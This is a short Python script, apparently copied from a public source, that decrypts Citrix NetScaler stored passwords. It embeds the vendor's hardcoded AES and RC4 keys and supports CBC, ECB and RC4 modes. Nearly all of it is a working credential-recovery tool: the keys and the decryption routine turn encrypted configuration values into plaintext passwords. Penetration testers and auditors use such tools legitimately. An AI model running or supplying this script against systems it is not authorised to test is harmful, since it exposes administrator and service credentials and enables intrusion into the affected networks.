#!/usr/bin/env python3

import base64
import argparse
import binascii
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# This script is a copy from the following website: https://dozer.nz/citrix-decrypt/
# Basically just a backup since, such resources often disappear at some point :)
# Python3 compatible version. Keys are hardcoded in netscaler libnscli90.so

aeskey = binascii.unhexlify("351CBE38F041320F22D990AD8365889C7DE2FCCCAE5A1A8707E21E4ADCCD4AD9")
rc4key = binascii.unhexlify("2286da6ca015bcd9b7259753c2a5fbc2")
mode = ['RC4', 'ENCMTHD_1', 'ECB', 'ENCMTHD_2', 'CBC', 'ENCMTHD_3']
unpad = lambda s : s[:-s[-1]]

parser = argparse.ArgumentParser(description='''Decryption script for Netscaler encrypted passwords
                                                - Original code by @dozernz.  Edited and ported to
                                                python3 by @qtc_de.''')

parser.add_argument('ciphertext', help='encrypted credential')
parser.add_argument('--mode', choices=mode, default='CBC', help='cipher mode (default=CBC)')

args = parser.parse_args()
ciphertext = binascii.unhexlify(args.ciphertext)

if args.mode in ['CBC', 'ENCMTHD_3']:
    cipher = Cipher(algorithms.AES(aeskey), modes.CBC(b'\x00' * 16))

elif args.mode in ['ECB', 'ENCMTHD_2']:
    cipher = Cipher(algorithms.AES(aeskey), modes.ECB())

elif args.mode in ['RC4', 'ENCMTHD_1']:
    cipher = Cipher(algorithms.ARC4(rc4key), mode=None)

decryptor = cipher.decryptor()
decrypted = decryptor.update(ciphertext) + decryptor.finalize()

if args.mode in ['CBC', 'ENCMTHD_3']:
    decrypted = unpad(decrypted)[16:]

try:
    print(decrypted.decode())

except UnicodeDecodeError:
    print("[-] Caught UnicodeDecodeError. Decrypted password is probably junk.")
    print(b"[-] Decrypted: " + decrypted)
